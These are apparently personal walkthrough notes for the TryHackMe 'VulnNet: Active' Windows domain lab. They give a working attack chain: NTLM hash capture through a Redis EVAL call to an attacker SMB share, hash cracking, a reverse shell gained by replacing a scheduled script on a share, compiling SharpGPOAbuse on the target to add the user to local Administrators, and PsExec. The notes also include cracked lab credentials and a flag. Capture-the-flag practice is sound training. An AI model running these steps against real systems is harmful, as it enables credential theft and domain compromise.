# TryHackMe — VulnNet: Active Quick Command Notes

> **Purpose:** reusable lab checklist for the Redis foothold, Kali/VPN transfer, Windows C# build of SharpGPOAbuse, GPO privilege escalation, and final verification.
>
> **Important:** IP addresses can change after a TryHackMe machine reset. Re-check `TUN_IP` and `TARGET_IP` every time. The values below are examples from one session, not permanent values.

---

## 0. Values to refresh on every new session

### Connect to TryHackMe VPN (only if `tun0` is not already up)

```bash
sudo openvpn --config <your-TryHackMe.ovpn>
```

Leave the VPN process running in its terminal. This room used the TryHackMe VPN interface; no separate SSH port-forward tunnel was needed.

### Kali — VPN/TUN interface (the callback/download IP)

```bash
ip -br -4 addr show tun0
```

Example from the recorded session: `192.168.134.60` — replace it with the current `tun0` address.

Optional variable:

```bash
TUN_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]}'); echo "$TUN_IP"
```

### Target IP

Use the current TryHackMe target IP / latest Nmap result. In the notes from this session, target IPs changed between resets (`10.65.169.209`, `10.65.143.88`, `10.65.169.180`, `10.65.134.101`, etc.). Do **not** reuse an old one blindly.

Check route and SMB reachability:

```bash
ip route get <TARGET_IP>
```

```bash
nmap -Pn -p445 <TARGET_IP>
```

> `tun0` is the TryHackMe VPN interface. This is not an SSH port-forward tunnel. Use the current `tun0` IP for Responder, reverse-shell callbacks, and the temporary HTTP server.

---

## 1. Initial foothold reminders (skip if you already have the PowerShell shell)

### Redis + Responder NTLM capture

Terminal 1 — Kali:

```bash
sudo responder -I tun0 -dwv
```

Terminal 2 — connect to Redis:

```bash
redis-cli -h <TARGET_IP>
```

At the Redis prompt, trigger the outbound SMB authentication to your current TUN IP:

```redis
EVAL "dofile('//<TUN_IP>/test')" 0
```

Save the captured NetNTLMv2 hash and crack it:

```bash
hashcat -m 5600 enterprise.hash /usr/share/wordlists/rockyou.txt
```

Lab account recovered in this session:

```text
Username: enterprise-security
Password: sand_0873959498
Domain:   vulnnet.local
```

### SMB share access

```bash
smbclient -L //<TARGET_IP> -U enterprise-security --password='sand_0873959498'
```

```bash
smbclient //<TARGET_IP>/Enterprise-Share -U enterprise-security --password='sand_0873959498'
```

Inside `smbclient`:

```text
dir
get PurgeIrrelevantData_1826.ps1
put PurgeIrrelevantData_1826.ps1
exit
```

The `PurgeIrrelevantData_1826.ps1` share/script replacement was the foothold path in the supplied walkthrough. Use the lab's authorized reverse-shell payload and your current `TUN_IP`/listener port.

### Catch the reverse shell

Kali:

```bash
nc -lvnp 4444
```

When the shell connects, record the peer IP shown by Netcat; confirm it against the current target/Nmap result before using it as `TARGET_IP`.

User flag location:

```powershell
type C:\Users\enterprise-security\Desktop\user.txt
```

---

## 2. SharpGPOAbuse source, DLL, and EXE build (the route that worked)

### What the files are

- `Program.cs` = the C# source file (not a native `.c` file).
- `CommandLine.dll` = required .NET dependency.
- `SharpGPOAbuse.exe` = compiled executable.

The recorded Kali/Mono build path was troublesome. The **successful build in this session was done on the Windows target with its `csc.exe` compiler**.

### Kali — prepare the two files for transfer

Run from the SharpGPOAbuse repository root:

```bash
cd /home/kali/Desktop/Tryhackme/SharpGPOAbuse
mkdir -p /tmp/gpo-build
cp SharpGPOAbuse/Program.cs /tmp/gpo-build/
cp packages/CommandLineParser.1.9.3.15/lib/CommandLine.dll /tmp/gpo-build/
ls -lh /tmp/gpo-build
```

Expected files: `Program.cs` and `CommandLine.dll`.

Start the HTTP server **from that folder** and leave it running:

```bash
cd /tmp/gpo-build
python3 -m http.server 8000 --bind 0.0.0.0
```

### Windows PowerShell — download source and dependency

Replace `192.168.134.60` with the current `TUN_IP` from section 0:

```powershell
New-Item -ItemType Directory -Force C:\Users\enterprise-security\gpo-build | Out-Null
```

```powershell
Invoke-WebRequest -UseBasicParsing -Uri "http://<TUN_IP>:8000/Program.cs" -OutFile "C:\Users\enterprise-security\gpo-build\Program.cs"
```

```powershell
Invoke-WebRequest -UseBasicParsing -Uri "http://<TUN_IP>:8000/CommandLine.dll" -OutFile "C:\Users\enterprise-security\gpo-build\CommandLine.dll"
```

Verify both files:

```powershell
Get-ChildItem C:\Users\enterprise-security\gpo-build | Select-Object Name,Length
```

### Windows PowerShell — compile EXE

Run the following from the `gpo-build` folder. This exact compiler/reference approach succeeded in the recorded session:

```powershell
cd C:\Users\enterprise-security\gpo-build
```

```powershell
$fw="$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319"; & "$fw\csc.exe" /nologo /target:exe /out:SharpGPOAbuse.exe /reference:CommandLine.dll /reference:System.dll /reference:System.Core.dll /reference:System.DirectoryServices.dll /reference:System.DirectoryServices.AccountManagement.dll /reference:System.DirectoryServices.Protocols.dll /reference:System.Xml.Linq.dll /reference:System.Data.DataSetExtensions.dll /reference:System.Data.dll /reference:System.Xml.dll Program.cs
```

Verify the EXE and its help:

```powershell
Get-Item .\SharpGPOAbuse.exe | Format-List Name,Length
```

```powershell
.\SharpGPOAbuse.exe --help
```

The help should list `--AddComputerTask`, `--TaskName`, `--Author`, `--Command`, `--Arguments`, `--GPOName`, and `--Force`.

> Keep `CommandLine.dll` in the same `gpo-build` folder as the executable. Do not run `SharpGPOAbuse.exe` from Kali's Bash prompt; run it in the Windows PowerShell session.

---

## 3. Privilege Escalation — GPO Exploitation

### Pre-check

```powershell
whoami
```

```powershell
echo $env:USERDNSDOMAIN
```

The BloodHound finding for this lab should show `enterprise-security` has `GenericWrite` over GPO `SECURITY-POL-VN`. Confirm the finding is for the current `vulnnet.local` domain and the current lab host.

### Apply the GPO computer immediate task

Run from `C:\Users\enterprise-security\gpo-build`:

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author "vulnnet\administrator" --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN" --Force
```

Immediately check the process exit code:

```powershell
$LASTEXITCODE
```

Successful run in this session returned `0` and printed messages including `Creating file ... ScheduledTasks.xml`, `versionNumber attribute changed successfully`, and `[+] Done!`.

### Refresh policy and verify membership

```powershell
gpupdate /force
```

```powershell
net localgroup administrators
```

Or:

```powershell
net user enterprise-security
```

**Success condition:** `enterprise-security` appears in the local `Administrators` group. In the recorded successful run, it appeared in both commands after `gpupdate /force`.

> Do not assume success just because `gpupdate` says it completed. Check the `SharpGPOAbuse` output, `$LASTEXITCODE`, and group membership. Earlier commands with the wrong/old executable produced no GPO change.

---

## 4. New privileged session with Impacket PsExec

Use the **current** target IP, not an old IP from a previous room reset. After the local Administrators membership is confirmed, from Kali:

```bash
psexec.py 'enterprise-security:sand_0873959498@<TARGET_IP>'
```

The recorded successful command used target `10.65.134.101`; a different older host IP failed because `ADMIN$` was not writable / Service Control Manager could not be opened. This is why the current target IP and the successful GPO membership check matter.

In the new Windows shell:

```cmd
whoami
```

Read the root/system flag path shown by this room's write-up:

```cmd
type C:\Users\Administrator\Desktop\system.txt
```

Recorded root flag from this session:

```text
THM{d540c0645975900e5bb9167aa431fc9b}
```

---

## 5. Quick troubleshooting checklist

| Symptom | Check |
|---|---|
| Windows cannot download a file | HTTP server is running in the folder containing that file; use current `TUN_IP`; confirm port `8000` is reachable. |
| `Program.cs` not found during compile | `cd C:\Users\enterprise-security\gpo-build` first; verify `Program.cs` is in that folder. |
| `SharpGPOAbuse.exe` exits with `-2146232576` | This was the old Mono-built/incorrect-runtime executable. Rebuild on Windows with the `csc.exe` command above. |
| `CommandLine.dll` missing | Download/copy it beside `Program.cs` and keep it beside the compiled EXE. |
| SharpGPOAbuse has no success output / nonzero exit code | Do not keep repeating it. Check `--help`, executable timestamp/size, domain/GPO name, and BloodHound permission. |
| `gpupdate` succeeds but user is not in Administrators | GPO modification/task has not been proven. Verify SharpGPOAbuse output and `net localgroup administrators`. |
| PsExec cannot open `ADMIN$` or SVCManager | Verify that GPO membership applied and use the current target IP; old reset IPs are not reliable. |

---

## 6. Minimal run order (fast checklist)

1. Kali: check `tun0` IP and current target IP.
2. If foothold is needed: Redis → Responder → crack hash → SMB share → get/replace scheduled PowerShell script → Netcat shell.
3. Kali: stage `Program.cs` + `CommandLine.dll` in `/tmp/gpo-build`; start HTTP server on port `8000`.
4. Windows: download both files to `C:\Users\enterprise-security\gpo-build`.
5. Windows: compile with `csc.exe`; run `SharpGPOAbuse.exe --help`.
6. Windows: run the `Debug` / `SECURITY-POL-VN` GPO command with `--Force`; require exit code `0`.
7. Windows: `gpupdate /force`; verify `enterprise-security` appears in Administrators.
8. Kali: PsExec to the current target IP; read `C:\Users\Administrator\Desktop\system.txt`.
